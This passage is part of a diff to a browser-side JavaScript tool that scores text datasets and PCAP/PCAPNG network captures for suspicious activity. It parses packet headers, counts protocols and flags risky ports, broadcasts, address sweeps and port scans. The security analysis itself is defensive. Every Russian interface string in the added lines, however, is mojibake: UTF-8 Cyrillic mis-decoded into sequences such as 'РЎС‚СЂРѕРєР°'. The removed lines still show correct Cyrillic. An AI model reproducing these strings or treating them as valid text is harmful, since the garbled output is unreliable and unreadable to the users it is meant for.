+  if (["d4c3b2a1", "a1b2c3d4", "4d3cb2a1", "a1b23c4d"].includes(sig) || ext === "pcap" || ext === "cap") return { kind: "pcap", variant: "pcap" };
+  if (sig === "0a0d0d0a" || ext === "pcapng") return { kind: "pcap", variant: "pcapng" };
+  if (ext === "csv" || ext === "tsv") return { kind: "csv" };
+  return { kind: "text" };
 }
 
+function analyzeText(text, file, kind) {
+  const lines = text.split(/\r?\n/);
+  const counts = new Map();
+  const indicators = [];
+  let matches = 0;
+  let severity = 0;
+
+  lines.forEach((line, i) => {
+    textPatterns.forEach((p) => {
+      if (p.regex.test(line)) {
+        matches += 1;
+        severity += p.severity;
+        counts.set(p.label, (counts.get(p.label) || 0) + 1);
+        indicators.push({
+          title: p.label,
+          description: `РЎС‚СЂРѕРєР° ${i + 1}: ${truncate(line.trim() || "(РїСѓСЃС‚Р°СЏ СЃС‚СЂРѕРєР°)", 140)}`,
+          meta: `severity=${p.severity}`
+        });
+      }
+    });
+  });
+
+  const nonEmpty = lines.filter((line) => line.trim()).length;
+  const cols = estimateColumns(lines, kind);
+  const sorted = sortMap(counts).slice(0, 8);
+  const risk = clamp(Math.round(severity * 2.6 + (matches / Math.max(lines.length, 1)) * 160), 0, 100);
+
+  return {
+    dataset: file.name,
+    size: file.size,
+    type: kind === "csv" ? "CSV / С‚РµРєСЃС‚РѕРІР°СЏ С‚Р°Р±Р»РёС†Р°" : "РўРµРєСЃС‚РѕРІС‹Р№ РґР°С‚Р°СЃРµС‚",
+    mode: "РўРµРєСЃС‚РѕРІС‹Р№ Р°РЅР°Р»РёР·",
+    risk,
+    records: lines.length,
+    recordsLabel: "РЎС‚СЂРѕРєРё",
+    matches,
+    matchText: matches ? `${matches} СЃРѕРІРїР°РґРµРЅРёР№ РїРѕ СЌРІСЂРёСЃС‚РёРєР°Рј` : "РћРїР°СЃРЅС‹Рµ С‚РѕРєРµРЅС‹ РЅРµ РЅР°Р№РґРµРЅС‹",
+    recordMeta: `РќРµРїСѓСЃС‚С‹С… СЃС‚СЂРѕРє: ${nonEmpty}`,
+    typeMeta: `РЎС‚РѕР»Р±С†РѕРІ: ${cols}`,
+    statusTitle: matches ? "РўРµРєСЃС‚РѕРІС‹Р№ РґР°С‚Р°СЃРµС‚ РѕР±СЂР°Р±РѕС‚Р°РЅ, РїСЂРёР·РЅР°РєРё СЂРёСЃРєР° РѕР±РЅР°СЂСѓР¶РµРЅС‹" : "РўРµРєСЃС‚РѕРІС‹Р№ РґР°С‚Р°СЃРµС‚ РѕР±СЂР°Р±РѕС‚Р°РЅ, РєСЂРёС‚РёС‡РЅС‹С… СЃРѕРІРїР°РґРµРЅРёР№ РЅРµС‚",
+    statusText: matches ? "РќР°Р№РґРµРЅС‹ РєРѕРјР°РЅРґС‹, URL Рё СЃРёРіРЅР°Р»С‹, С…Р°СЂР°РєС‚РµСЂРЅС‹Рµ РґР»СЏ РІСЂРµРґРѕРЅРѕСЃРЅРѕР№ Р°РєС‚РёРІРЅРѕСЃС‚Рё." : "Р’ РїРµСЂРІС‹С… СЌРІСЂРёСЃС‚РёРєР°С… РІС‹СЂР°Р¶РµРЅРЅС‹Рµ СЃРёРіРЅР°С‚СѓСЂС‹ РІСЂРµРґРѕРЅРѕСЃРЅРѕР№ Р°РєС‚РёРІРЅРѕСЃС‚Рё РЅРµ РѕР±РЅР°СЂСѓР¶РµРЅС‹.",
+    previewType: kind === "csv" ? "CSV preview" : "Text preview",
+    preview: lines.slice(0, 18).map((line, i) => `${String(i + 1).padStart(3, "0")} | ${line}`).join("\n") || "Р¤Р°Р№Р» РїСѓСЃС‚.",
+    indicators: indicators.slice(0, 10),
+    network: [
+      { title: "Р¤РѕСЂРјР°С‚ РёСЃС‚РѕС‡РЅРёРєР°", description: kind === "csv" ? "РЎС‚СЂСѓРєС‚СѓСЂРёСЂРѕРІР°РЅРЅС‹Р№ С‚РµРєСЃС‚РѕРІС‹Р№ РґР°С‚Р°СЃРµС‚." : "РќРµСЃС‚СЂСѓРєС‚СѓСЂРёСЂРѕРІР°РЅРЅС‹Р№ Р¶СѓСЂРЅР°Р» РёР»Рё С‚РµРєСЃС‚РѕРІС‹Р№ СЌРєСЃРїРѕСЂС‚.", meta: `columns=${cols}` },
+      { title: "РќРµРїСѓСЃС‚С‹Рµ СЃС‚СЂРѕРєРё", description: `${nonEmpty} РёР· ${lines.length} СЃС‚СЂРѕРє СЃРѕРґРµСЂР¶Р°С‚ РґР°РЅРЅС‹Рµ.`, meta: "line-density" },
+      { title: "РЈРЅРёРєР°Р»СЊРЅС‹Рµ С‚РѕРєРµРЅС‹", description: `${sorted.length} РґРµС‚РµРєС‚РѕСЂРѕРІ СЃСЂР°Р±РѕС‚Р°Р»Рё С…РѕС‚СЏ Р±С‹ РѕРґРёРЅ СЂР°Р·.`, meta: "ioc-spectrum" }
+    ],
+    chart: {
+      barTitle: "Р Р°СЃРїСЂРµРґРµР»РµРЅРёРµ РїРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹С… С‚РѕРєРµРЅРѕРІ",
+      doughnutTitle: "РќРѕСЂРјР°Р»СЊРЅС‹Рµ Рё РїРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Рµ СЃС‚СЂРѕРєРё",
+      barLabels: sorted.map(([k]) => k),
+      barValues: sorted.map(([, v]) => v),
+      doughnutLabels: ["РќРѕСЂРјР°Р»СЊРЅС‹Рµ", "РџРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Рµ"],
+      doughnutValues: [Math.max(lines.length - Math.min(lines.length, matches), 0), Math.min(lines.length, matches)]
+    }
+  };
 }
 
+function analyzeCapture(buffer, file, variant) {
+  return variant === "pcapng" ? analyzePcapNg(buffer, file) : analyzePcap(buffer, file);
 }
 
-const risk = Math.min(100,Math.round((suspicious/Math.max(lines.length,1))*450))
-
-riskBar.style.width = risk + "%"
-riskText.textContent = risk + "%"
-
-tokensBox.innerHTML = Object.entries(tokenHits)
-.map(x=>x[0]+" : "+x[1])
-.join("<br>") || "совпадений нет"
-
-info.innerHTML =
-"Строк: "+lines.length+
-"<br>Подозрительных совпадений: "+suspicious
-
-drawCharts(tokenHits,suspicious,lines.length)
-
+function createStats(file, type) {
+  return {
+    type,
+    size: file.size,
+    packets: 0,
+    suspiciousPackets: 0,
+    suspiciousHits: 0,
+    protocols: new Map(),
+    indicators: new Map(),
+    src: new Map(),
+    dst: new Map(),
+    srcDest: new Map(),
+    srcPorts: new Map(),
+    preview: [],
+    first: null,
+    last: null,
+    ipv4: 0,
+    ipv6: 0,
+    other: 0
+  };
 }
 
-function drawCharts(tokens,totalHits,totalLines){
+function analyzePcap(buffer, file) {
+  const view = new DataView(buffer);
+  const sig = [...new Uint8Array(buffer, 0, 4)].map((v) => v.toString(16).padStart(2, "0")).join("");
+  const le = sig === "d4c3b2a1" || sig === "4d3cb2a1";
+  const link = view.getUint32(20, le);
+  let off = 24;
+  const s = createStats(file, `РљР»Р°СЃСЃРёС‡РµСЃРєРёР№ PCAP linktype=${link}`);
 
-const labels = Object.keys(tokens)
-const values = Object.values(tokens)
+  while (off + 16 <= buffer.byteLength) {
+    const sec = view.getUint32(off, le);
+    const usec = view.getUint32(off + 4, le);
+    const len = view.getUint32(off + 8, le);
+    if (off + 16 + len > buffer.byteLength) break;
+    processPacket(s, new Uint8Array(buffer, off + 16, len), link, sec + usec / 1000000);
+    off += 16 + len;
+  }
 
-if(chart1) chart1.destroy()
-if(chart2) chart2.destroy()
-
-chart1 = new Chart(
-document.getElementById("chart1"),
-{
-type:"bar",
-data:{
-labels:labels,
-datasets:[
-{
-label:"Token frequency",
-data:values
-}
-]
-}
-}
-)
-
-chart2 = new Chart(
-document.getElementById("chart2"),
-{
-type:"doughnut",
-data:{
-labels:["Normal","Suspicious"],
-datasets:[
-{
-data:[Math.max(totalLines-totalHits,0),totalHits]
-}
-]
-}
-}
-)
-
+  return finalizeStats(s, file.name);
 }
 
-function analyzePCAP(arrayBuffer){
+function analyzePcapNg(buffer, file) {
+  const view = new DataView(buffer);
+  const s = createStats(file, "PCAPNG");
+  let off = 0;
+  let le = true;
+  const ifaces = [];
 
-const parser = new PcapParser(arrayBuffer)
+  while (off + 12 <= buffer.byteLength) {
+    const type = view.getUint32(off, true);
+    const total = view.getUint32(off + 4, true);
+    if (total < 12 || off + total > buffer.byteLength) break;
 
-let packets = 0
-let ipStats = {}
+    if (type === 0x0A0D0D0A) {
+      le = view.getUint32(off + 8, true) === 0x1A2B3C4D;
+    } else if (type === 0x00000001 && total >= 20) {
+      ifaces.push({ link: view.getUint16(off + 8, le) });
+    } else if (type === 0x00000006 && total >= 32) {
+      const id = view.getUint32(off + 8, le);
+      const capLen = view.getUint32(off + 20, le);
+      const packetOffset = off + 28;
+      if (packetOffset + capLen <= off + total) {
+        const high = view.getUint32(off + 12, le);
+        const low = view.getUint32(off + 16, le);
+        processPacket(s, new Uint8Array(buffer, packetOffset, capLen), ifaces[id]?.link || 1, ((high * 2 ** 32) + low) / 1000000);
+      }
+    } else if (type === 0x00000003 && total >= 20) {
+      const orig = view.getUint32(off + 8, le);
+      const capLen = Math.min(orig, total - 16);
+      processPacket(s, new Uint8Array(buffer, off + 12, capLen), 1, 0);
+    }
 
-parser.on("packet",function(pkt){
+    off += total;
+  }
 
-packets++
-
-const data = new Uint8Array(pkt.data)
-
-if(data.length > 34){
-
-const src =
-data[26]+"."+data[27]+"."+data[28]+"."+data[29]
-
-const dst =
-data[30]+"."+data[31]+"."+data[32]+"."+data[33]
-
-ipStats[src] = (ipStats[src]||0)+1
-ipStats[dst] = (ipStats[dst]||0)+1
-
+  s.type = "PCAPNG multi-block capture";
+  return finalizeStats(s, file.name);
 }
 
-})
+function processPacket(stats, data, linkType, ts) {
+  stats.packets += 1;
+  if (ts > 0) {
+    if (stats.first === null) stats.first = ts;
+    stats.last = ts;
+  }
 
-parser.on("end",function(){
+  const packet = parsePacket(data, linkType);
+  const proto = packet.protocol || "Other";
+  stats.protocols.set(proto, (stats.protocols.get(proto) || 0) + 1);
 
-console.log("Packets:",packets)
-console.log("IP stats:",ipStats)
+  if (packet.version === 4) stats.ipv4 += 1;
+  else if (packet.version === 6) stats.ipv6 += 1;
+  else stats.other += 1;
 
-})
+  if (packet.src) stats.src.set(packet.src, (stats.src.get(packet.src) || 0) + 1);
+  if (packet.dst) stats.dst.set(packet.dst, (stats.dst.get(packet.dst) || 0) + 1);
 
+  if (packet.src && packet.dst) {
+    if (!stats.srcDest.has(packet.src)) stats.srcDest.set(packet.src, new Set());
+    stats.srcDest.get(packet.src).add(packet.dst);
+  }
+
+  if (packet.src && Number.isFinite(packet.dstPort)) {
+    if (!stats.srcPorts.has(packet.src)) stats.srcPorts.set(packet.src, new Set());
+    stats.srcPorts.get(packet.src).add(packet.dstPort);
+  }
+
+  let suspicious = false;
+  if (Number.isFinite(packet.dstPort) && riskyPorts.has(packet.dstPort)) {
+    const label = `РџРѕСЂС‚ ${packet.dstPort} (${riskyPorts.get(packet.dstPort)})`;
+    stats.indicators.set(label, (stats.indicators.get(label) || 0) + 1);
+    stats.suspiciousHits += 1;
+    suspicious = true;
+  }
+
+  if (packet.isBroadcast) {
+    stats.indicators.set("РЁРёСЂРѕРєРѕРІРµС‰Р°С‚РµР»СЊРЅС‹Р№ С‚СЂР°С„РёРє", (stats.indicators.get("РЁРёСЂРѕРєРѕРІРµС‰Р°С‚РµР»СЊРЅС‹Р№ С‚СЂР°С„РёРє") || 0) + 1);
+    stats.suspiciousHits += 1;
+    suspicious = true;
+  }
+
+  if (suspicious) stats.suspiciousPackets += 1;
+
+  if (stats.preview.length < 12) {
+    stats.preview.push([
+      `#${String(stats.packets).padStart(4, "0")}`,
+      packet.src || "unknown",
+      packet.dst ? `-> ${packet.dst}` : "-> ?",
+      proto,
+      Number.isFinite(packet.srcPort) ? packet.srcPort : "",
+      Number.isFinite(packet.dstPort) ? `:${packet.dstPort}` : ""
+    ].filter(Boolean).join(" "));
+  }
 }
 
-function clearUI(){
+function finalizeStats(stats, dataset) {
+  const scanFindings = [];
 
-preview.textContent = ""
+  stats.srcDest.forEach((set, src) => {
+    if (set.size >= 8) {
+      const label = "РЁРёСЂРѕРєРёР№ РѕР±С…РѕРґ Р°РґСЂРµСЃРѕРІ";
+      stats.indicators.set(label, (stats.indicators.get(label) || 0) + set.size);
+      scanFindings.push({ title: label, description: `${src} РѕР±СЂР°С‰Р°РµС‚СЃСЏ Рє ${set.size} СѓРЅРёРєР°Р»СЊРЅС‹Рј СѓР·Р»Р°Рј.`, meta: "scan-heuristic" });
+    }
+  });
 
-info.textContent = "Файл не загружен"
+  stats.srcPorts.forEach((set, src) => {
+    if (set.size >= 10) {
+      const label = "РЎРєР°РЅРёСЂРѕРІР°РЅРёРµ РїРѕ РїРѕСЂС‚Р°Рј";
+      stats.indicators.set(label, (stats.indicators.get(label) || 0) + set.size);
+      scanFindings.push({ title: label, description: `${src} РёСЃРїРѕР»СЊР·СѓРµС‚ ${set.size} СЂР°Р·Р»РёС‡РЅС‹С… РїРѕСЂС‚РѕРІ РЅР°Р·РЅР°С‡РµРЅРёСЏ.`, meta: "port-sweep" });
+    }
+  });
 
-tokensBox.textContent = "—"
+  const indicators = sortMap(stats.indicators);
+  const protocols = sortMap(stats.protocols);
+  const topSrc = sortMap(stats.src).slice(0, 3);
+  const topDst = sortMap(stats.dst).slice(0, 3);
+  const duration = stats.first !== null && stats.last !== null ? Math.max(stats.last - stats.first, 0) : 0;
+  const rate = duration > 0 ? stats.packets / duration : stats.packets;
+  const risk = clamp(Math.round((stats.suspiciousPackets / Math.max(stats.packets, 1)) * 60 + Math.min(scanFindings.length * 14, 28) + Math.min(indicators.length * 5, 20) + Math.min(rate, 18)), 0, 100);
+  const previewHead = [
+    `Capture type: ${stats.type}`,
+    `Packets: ${stats.packets}`,
+    `IPv4: ${stats.ipv4} | IPv6: ${stats.ipv6} | Other: ${stats.other}`,
+    `Top sources: ${topSrc.map(([host, c]) => `${host} (${c})`).join(", ") || "n/a"}`,
+    ""
+  ].join("\n");
 
-riskBar.style.width = "0%"
+  const indicatorList = [
+    ...indicators.slice(0, 7).map(([title, v]) => ({
+      title,
+      description: `РћР±РЅР°СЂСѓР¶РµРЅРѕ ${v} СЃРѕРІРїР°РґРµРЅРёР№ РІ РїР°РєРµС‚Р°С… Рё СЃРµС‚РµРІС‹С… СЃРѕР±С‹С‚РёСЏС….`,
+      meta: "traffic-indicator"
+    })),
+    ...scanFindings
+  ].slice(0, 10);
 
-riskText.textContent = "—"
-
-fileInput.value = ""
-
-if(chart1) chart1.destroy()
-if(chart2) chart2.destroy()
-
+  return {
+    dataset,
+    size: stats.size,
+    type: stats.type,
+    mode: "РђРЅР°Р»РёР· СЃРµС‚РµРІРѕРіРѕ С‚СЂР°С„РёРєР°",
+    risk,
+    records: stats.packets,
+    recordsLabel: "РџР°РєРµС‚С‹",
+    matches: stats.suspiciousHits + scanFindings.length,
+    matchText: stats.suspiciousHits ? `${stats.suspiciousHits} СЃРµС‚РµРІС‹С… СЃРѕРІРїР°РґРµРЅРёР№ Рё ${scanFindings.length} СЌРІСЂРёСЃС‚РёРє` : "РљСЂРёС‚РёС‡РЅС‹С… СЃРµС‚РµРІС‹С… СЃРѕРІРїР°РґРµРЅРёР№ РЅРµ РІС‹СЏРІР»РµРЅРѕ",
+    recordMeta: `IPv4: ${stats.ipv4}, IPv6: ${stats.ipv6}`,
+    typeMeta: `РџСЂРѕС‚РѕРєРѕР»РѕРІ: ${protocols.length}`,
+    statusTitle: stats.packets ? "Р—Р°С…РІР°С‚ С‚СЂР°С„РёРєР° РѕР±СЂР°Р±РѕС‚Р°РЅ" : "Р¤Р°Р№Р» СЂР°СЃРїРѕР·РЅР°РЅ, РЅРѕ РїР°РєРµС‚С‹ РЅРµ РёР·РІР»РµС‡РµРЅС‹",
+    statusText: stats.packets ? "РЎС„РѕСЂРјРёСЂРѕРІР°РЅР° СЃС‚Р°С‚РёСЃС‚РёРєР° РїР°РєРµС‚РѕРІ, Р°РґСЂРµСЃРѕРІ, РїРѕСЂС‚РѕРІ Рё РІРѕР·РјРѕР¶РЅС‹С… СЃРµС‚РµРІС‹С… РѕС‚РєР»РѕРЅРµРЅРёР№." : "РџСЂРѕС‚РѕС‚РёРї Р»СѓС‡С€Рµ РІСЃРµРіРѕ СЂР°Р±РѕС‚Р°РµС‚ СЃ РєР»Р°СЃСЃРёС‡РµСЃРєРёРј PCAP Рё Р±Р°Р·РѕРІС‹Рј PCAPNG.",
+    previewType: stats.type,
+    preview: `${previewHead}${stats.preview.join("\n") || "РџР°РєРµС‚С‹ РЅРµ РѕС‚РѕР±СЂР°Р¶РµРЅС‹."}`,
+    indicators: indicatorList.length ? indicatorList : [{ title: "РџРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Рµ РёРЅРґРёРєР°С‚РѕСЂС‹ РЅРµ РЅР°Р№РґРµРЅС‹", description: "Р’ С‚РµРєСѓС‰РµРј РѕРєРЅРµ Р°РЅР°Р»РёР·Р° РЅРµ РѕР±РЅР°СЂСѓР¶РµРЅРѕ РІС‹СЂР°Р¶РµРЅРЅС‹С… СЃРµС‚РµРІС‹С… IOC.", meta: "clean-window" }],
+    network: [
+      { title: "Р’РµРґСѓС‰РёРµ РёСЃС‚РѕС‡РЅРёРєРё", description: topSrc.map(([host, c]) => `${host} (${c})`).join(", ") || "РќРµРґРѕСЃС‚Р°С‚РѕС‡РЅРѕ РґР°РЅРЅС‹С….", meta: "top-src" },
+      { title: "Р’РµРґСѓС‰РёРµ РЅР°Р·РЅР°С‡РµРЅРёСЏ", description: topDst.map(([host, c]) => `${host} (${c})`).join(", ") || "РќРµРґРѕСЃС‚Р°С‚РѕС‡РЅРѕ РґР°РЅРЅС‹С….", meta: "top-dst" },
+      { title: "РРЅС‚РµРЅСЃРёРІРЅРѕСЃС‚СЊ", description: `${rate.toFixed(2)} РїР°Рє/СЃРµРє, РґР»РёС‚РµР»СЊРЅРѕСЃС‚СЊ РѕРєРЅР° ${duration.toFixed(2)} СЃРµРє.`, meta: "rate-profile" }
+    ],
+    chart: {
+      barTitle: "Р Р°СЃРїСЂРµРґРµР»РµРЅРёРµ СЃРµС‚РµРІС‹С… РёРЅРґРёРєР°С‚РѕСЂРѕРІ",
+      doughnutTitle: "РќРѕСЂРјР°Р»СЊРЅС‹Р№ Рё РїРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Р№ С‚СЂР°С„РёРє",
+      barLabels: (indicators.length ? indicators : protocols).slice(0, 8).map(([k]) => k),
+      barValues: (indicators.length ? indicators : protocols).slice(0, 8).map(([, v]) => v),
+      doughnutLabels: ["РќРѕСЂРјР°Р»СЊРЅС‹Р№", "РџРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Р№"],
+      doughnutValues: [Math.max(stats.packets - stats.suspiciousPackets, 0), stats.suspiciousPackets]
+    }
+  };
 }
+
+function parsePacket(data, linkType) {
+  if (linkType === 1) return parseEthernet(data);
+  if (linkType === 101) return parseIp(data, 0);
+  return { protocol: "Other" };
+}
+
+function parseEthernet(frame) {
+  if (frame.length < 14) return { protocol: "Other" };
+  const dstMac = bytesToHex(frame.slice(0, 6), ":");
+  let etherType = read16(frame, 12);
+  let offset = 14;
+  if (etherType === 0x8100 && frame.length >= 18) {
+    etherType = read16(frame, 16);
+    offset = 18;
+  }
+  if (etherType === 0x0800 || etherType === 0x86dd) {
+    const packet = parseIp(frame, offset);
+    packet.isBroadcast = dstMac === "ff:ff:ff:ff:ff:ff";
+    return packet;
+  }
+  return { protocol: "Other", isBroadcast: dstMac === "ff:ff:ff:ff:ff:ff" };
+}
+
+function parseIp(frame, offset) {
+  if (frame.length <= offset) return { protocol: "Other" };
+  const version = frame[offset] >> 4;
+  if (version === 4 && frame.length >= offset + 20) {
+    const ihl = (frame[offset] & 0x0f) * 4;
+    const proto = frame[offset + 9];
+    const ports = parsePorts(frame, offset + ihl, proto);
+    return {
+      version: 4,
+      protocol: protoName(proto),
+      src: `${frame[offset + 12]}.${frame[offset + 13]}.${frame[offset + 14]}.${frame[offset + 15]}`,
+      dst: `${frame[offset + 16]}.${frame[offset + 17]}.${frame[offset + 18]}.${frame[offset + 19]}`,
+      srcPort: ports.srcPort,
+      dstPort: ports.dstPort
+    };
+  }
+  if (version === 6 && frame.length >= offset + 40) {
+    const proto = frame[offset + 6];
+    const ports = parsePorts(frame, offset + 40, proto);
+    return {
+      version: 6,
+      protocol: protoName(proto),
+      src: formatIpv6(frame.slice(offset + 8, offset + 24)),
+      dst: formatIpv6(frame.slice(offset + 24, offset + 40)),
+      srcPort: ports.srcPort,
+      dstPort: ports.dstPort
+    };
+  }
+  return { protocol: "Other" };
+}
+
+function parsePorts(frame, offset, proto) {
+  return ((proto === 6 || proto === 17) && frame.length >= offset + 4)
+    ? { srcPort: read16(frame, offset), dstPort: read16(frame, offset + 2) }
+    : { srcPort: null, dstPort: null };
+}
+
+function protoName(v) {
+  return v === 1 ? "ICMP" : v === 6 ? "TCP" : v === 17 ? "UDP" : v === 58 ? "ICMPv6" : "Other";
+}
+
+function updateUI(result) {
+  const cls = riskClass(result.risk);
+  ui.heroRisk.textContent = result.risk;
+  ui.heroRisk.className = cls;
+  ui.mode.textContent = result.mode;
+  ui.dataset.textContent = result.dataset;
+  ui.statusTitle.textContent = result.statusTitle;
+  ui.statusText.textContent = result.statusText;
+  ui.risk.textContent = result.risk;
+  ui.risk.className = cls;
+  ui.riskText.textContent = riskText(result.risk);
+  ui.size.textContent = formatBytes(result.size);
+  ui.type.textContent = `${result.type} | ${result.typeMeta}`;
+  ui.records.textContent = result.records.toLocaleString("ru-RU");
+  ui.recordsText.textContent = `${result.recordsLabel}: ${result.recordMeta}`;
+  ui.matches.textContent = result.matches.toLocaleString("ru-RU");
+  ui.matchesText.textContent = result.matchText;
+  ui.previewName.textContent = result.dataset;
+  ui.previewType.textContent = result.previewType;
+  ui.preview.textContent = result.preview;
+  ui.barTitle.textContent = result.chart.barTitle;
+  ui.doughnutTitle.textContent = result.chart.doughnutTitle;
+  renderList(ui.indicatorList, result.indicators, "РРЅРґРёРєР°С‚РѕСЂС‹ РїРѕРєР° РЅРµ РѕР±РЅР°СЂСѓР¶РµРЅС‹");
+  renderList(ui.networkList, result.network, "РЎРµС‚РµРІРѕР№ РїСЂРѕС„РёР»СЊ Р±СѓРґРµС‚ РґРѕСЃС‚СѓРїРµРЅ РїРѕСЃР»Рµ Р°РЅР°Р»РёР·Р°");
+  renderCharts(result.chart);
+}
+
+function renderCharts(data) {
+  if (charts.bar) charts.bar.destroy();
+  if (charts.doughnut) charts.doughnut.destroy();
+  if (typeof Chart === "undefined") return;
+
+  const common = {
+    responsive: true,
+    maintainAspectRatio: false,
+    plugins: {
+      legend: { labels: { color: "#dce8ff", font: { family: "Space Grotesk", size: 12 } } },
+      tooltip: { backgroundColor: "rgba(7,16,31,.95)", borderColor: "rgba(133,167,255,.22)", borderWidth: 1, titleColor: "#edf4ff", bodyColor: "#c9d9ff" }
+    }
+  };
+
+  charts.bar = new Chart($("barChart"), {
+    type: "bar",
+    data: {
+      labels: data.barLabels.length ? data.barLabels : ["РќРµС‚ РґР°РЅРЅС‹С…"],
+      datasets: [{
+        label: "Count",
+        data: data.barValues.length ? data.barValues : [0],
+        backgroundColor: ["#5dd8ff", "#7cffb7", "#ffb454", "#ff5d86", "#8aa4ff", "#58f0d7", "#ffa66b", "#d286ff"],
+        borderRadius: 10,
+        borderSkipped: false
+      }]
+    },
+    options: {
+      ...common,
+      scales: {
+        x: { ticks: { color: "#9fb3d8", font: { family: "IBM Plex Mono", size: 11 } }, grid: { color: "rgba(133,167,255,.1)" } },
+        y: { ticks: { color: "#9fb3d8", font: { family: "IBM Plex Mono", size: 11 } }, grid: { color: "rgba(133,167,255,.08)" } }
+      }
+    }
+  });
+
+  charts.doughnut = new Chart($("doughnutChart"), {
+    type: "doughnut",
+    data: {
+      labels: data.doughnutLabels,
+      datasets: [{
+        data: data.doughnutValues,
+        backgroundColor: ["rgba(124,255,183,.86)", "rgba(255,93,134,.88)"],
+        borderColor: ["rgba(124,255,183,1)", "rgba(255,93,134,1)"],
+        borderWidth: 1
+      }]
+    },
+    options: { ...common, cutout: "68%" }
+  });
+}
+
+function renderList(node, items, empty) {
+  node.innerHTML = (!items || !items.length)
+    ? `<div class="item"><strong>${empty}</strong><span>Р—Р°РіСЂСѓР·РёС‚Рµ РґР°С‚Р°СЃРµС‚, С‡С‚РѕР±С‹ РїРѕР»СѓС‡РёС‚СЊ Р°РЅР°Р»РёС‚РёС‡РµСЃРєРёР№ РїСЂРѕС„РёР»СЊ.</span><small>awaiting-input</small></div>`
+    : items.map((item) => `<article class="item"><strong>${escapeHtml(item.title)}</strong><span>${escapeHtml(item.description)}</span><small>${escapeHtml(item.meta || "analysis")}</small></article>`).join("");
+}
+
+function renderError(message) {
+  ui.mode.textContent = "РћС€РёР±РєР° Р°РЅР°Р»РёР·Р°";
+  ui.statusTitle.textContent = "РќРµ СѓРґР°Р»РѕСЃСЊ РѕР±СЂР°Р±РѕС‚Р°С‚СЊ С„Р°Р№Р»";
+  ui.statusText.textContent = message;
+  ui.previewType.textContent = "Error";
+  ui.preview.textContent = message;
+  ui.risk.textContent = "0";
+  ui.riskText.textContent = "РћС€РёР±РєР°";
+}
+
+function riskText(score) {
+  return score >= 75 ? "Р’С‹СЃРѕРєРёР№ СЂРёСЃРє: РІРµСЂРѕСЏС‚РЅР° РІСЂРµРґРѕРЅРѕСЃРЅР°СЏ Р°РєС‚РёРІРЅРѕСЃС‚СЊ" : score >= 40 ? "РЎСЂРµРґРЅРёР№ СЂРёСЃРє: С‚СЂРµР±СѓРµС‚СЃСЏ РїСЂРѕРІРµСЂРєР° Р°РЅР°Р»РёС‚РёРєРѕРј" : "РќРёР·РєРёР№ СЂРёСЃРє: РІС‹СЂР°Р¶РµРЅРЅС‹С… СѓРіСЂРѕР· РЅРµРјРЅРѕРіРѕ";
+}
+
+function riskClass(score) {
+  return score >= 75 ? "risk-high" : score >= 40 ? "risk-medium" : "risk-low";
+}
+
+function sortMap(map) {
+  return [...map.entries()].sort((a, b) => b[1] - a[1]);
+}
+
+function estimateColumns(lines, kind) {
+  if (kind !== "csv") return 1;
+  const sample = lines.find((line) => line.trim()) || "";
+  const delimiter = sample.includes(";") ? ";" : sample.includes("\t") ? "\t" : ",";
+  return sample ? sample.split(delimiter).length : 0;
+}
+
+function bytesToHex(bytes, sep = "") {
+  return [...bytes].map((v) => v.toString(16).padStart(2, "0")).join(sep);
+}
+
+function read16(bytes, offset) {
+  return (bytes[offset] << 8) | bytes[offset + 1];
+}
+
+function formatIpv6(bytes) {
+  const groups = [];
+  for (let i = 0; i < bytes.length; i += 2) groups.push(((bytes[i] << 8) | bytes[i + 1]).toString(16));
+  return groups.join(":").replace(/(^|:)0(:0)+(:|$)/, "::");
+}
+
+function truncate(value, max) {
+  return value.length > max ? `${value.slice(0, max - 3)}...` : value;
+}
+
+function clamp(value, min, max) {
+  return Math.min(max, Math.max(min, value));
+}
+
+function formatBytes(value) {
+  if (!Number.isFinite(value) || value <= 0) return "0 B";
+  const units = ["B", "KB", "MB", "GB"];
+  const i = Math.min(Math.floor(Math.log(value) / Math.log(1024)), units.length - 1);
+  const size = value / (1024 ** i);
+  return `${size.toFixed(size >= 10 || i === 0 ? 0 : 1)} ${units[i]}`;
+}
+
+function escapeHtml(value) {
+  return String(value)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+renderList(ui.indicatorList, [], "РРЅРґРёРєР°С‚РѕСЂС‹ РїРѕРєР° РЅРµ РѕР±РЅР°СЂСѓР¶РµРЅС‹");
+renderList(ui.networkList, [], "РЎРµС‚РµРІРѕР№ РїСЂРѕС„РёР»СЊ РїСѓСЃС‚");
+renderCharts({
+  barLabels: ["РћР¶РёРґР°РЅРёРµ"],
+  barValues: [0],
+  doughnutLabels: ["РќРѕСЂРјР°Р»СЊРЅС‹Р№", "РџРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Р№"],
+  doughnutValues: [1, 0],
+  barTitle: "Р Р°СЃРїСЂРµРґРµР»РµРЅРёРµ РёРЅРґРёРєР°С‚РѕСЂРѕРІ",
+  doughnutTitle: "РќРѕСЂРјР°Р»СЊРЅС‹Р№ Рё РїРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Р№ С‚СЂР°С„РёРє"
+});
 
 </script>
-
 </body>
 </html>
